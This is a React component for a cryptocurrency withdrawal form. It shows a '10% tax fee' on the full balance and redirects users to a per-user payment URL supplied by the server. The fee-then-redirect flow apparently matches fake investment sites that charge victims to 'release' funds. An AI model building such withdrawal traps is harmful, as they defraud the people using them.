// frontend/src/pages/Withdraw.js
import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import api from '../utils/axiosInstance';
import './Withdraw.css';

export default function Withdraw() {
  const [user, setUser] = useState(undefined);
  const [amount, setAmount] = useState('');
  const [crypto, setCrypto] = useState('Bitcoin');
  const [address, setAddress] = useState('');
  const [tax, setTax] = useState(0);
  const navigate = useNavigate();

  useEffect(() => {
    api.get('/auth/me')
      .then(res => {
        setUser(res.data);
        setTax((res.data.walletBalance * 0.1).toFixed(2));
      })
      .catch(() => setUser(null));
  }, []);

  if (user === undefined) return <div>Loading...</div>;
  if (user === null)   return <div>Please log in.</div>;

  const handleConfirm = async e => {
    e.preventDefault();

    try {
      // Fetch user-specific approved URLs
      const res = await api.get('/users/payment-url');
      const approvedSlot = res.data.find(u => u.approved);

      if (approvedSlot && approvedSlot.url) {
        let url = approvedSlot.url.trim();
        if (!/^https?:\/\//i.test(url)) url = 'https://' + url;
        window.location.href = url;              // external redirect
      } else {
        // no approved URL → go to PIN verify page
        navigate('/verify-withdrawal', {
          state: { amount, crypto, address }
        });
      }
    } catch {
      // on error, fallback
      navigate('/verify-withdrawal', {
        state: { amount, crypto, address }
      });
    }
  };

  return (
    <div className="form-container">
      <h2>Withdraw Funds</h2>
      <p>Current Balance: ${user.walletBalance.toFixed(2)}</p>
      <p>Tax Fee (10%): ${tax}</p>
      <form onSubmit={handleConfirm}>
        <label>Amount to withdraw (min $200)</label>
        <input
          type="number"
          value={amount}
          onChange={e => setAmount(e.target.value)}
          min="200"
          max={user.walletBalance}
          required
        />

        <label>Choose Crypto</label>
        <select value={crypto} onChange={e => setCrypto(e.target.value)}>
          <option>Bitcoin</option>
          <option>Ethereum</option>
          <option>Ripple</option>
          <option>Tether</option>
          <option>Solana</option>
          <option>Dogecoin</option>
        </select>

        <label>Wallet Address</label>
        <input
          type="text"
          value={address}
          onChange={e => setAddress(e.target.value)}
          required
        />

        <button type="submit">Confirm Withdrawal</button>
      </form>
    </div>
  );
}
